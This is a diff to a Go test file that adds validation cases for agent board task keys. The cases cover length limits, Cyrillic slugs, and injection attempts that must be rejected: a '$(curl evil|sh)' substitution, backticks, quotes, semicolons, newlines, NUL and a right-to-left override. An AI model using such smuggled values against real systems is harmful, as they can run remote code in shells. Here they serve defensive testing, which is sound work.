@@ -1,6 +1,9 @@
 package agentcomm
 
-import "testing"
+import (
+	"strings"
+	"testing"
+)
 
 func TestBoardTaskStatus(t *testing.T) {
 	as := func(states ...AssignmentState) []BoardTaskAssignment {
@@ -87,7 +90,20 @@ func TestValidBoardTaskKey(t *testing.T) {
 		{"task/", false},
 		{"task/a/b", false},
 		{"fact/a", false},
-		{"task/" + string(make([]byte, 200)), false},
+		{"task/" + strings.Repeat("a", 195), true},
+		{"task/" + strings.Repeat("a", 196), false}, // 201 bytes
+		{"task/s1-t2_v1.0", true},
+		{"task/логин-форма", true}, // the dashboard makes Cyrillic slugs from titles
+		// The key goes into ready-to-run commands in messages: nothing a shell or a line break would act on.
+		{"task/x$(curl evil|sh)", false},
+		{"task/x`id`", false},
+		{"task/a b", false},
+		{"task/a;b", false},
+		{"task/a'b", false},
+		{"task/a\"b", false},
+		{"task/a\nb", false},
+		{"task/a\x00b", false},
+		{"task/a\u202eb", false}, // right-to-left override
 	}
 	for _, tt := range tests {
 		if got := ValidBoardTaskKey(tt.key); got != tt.want {
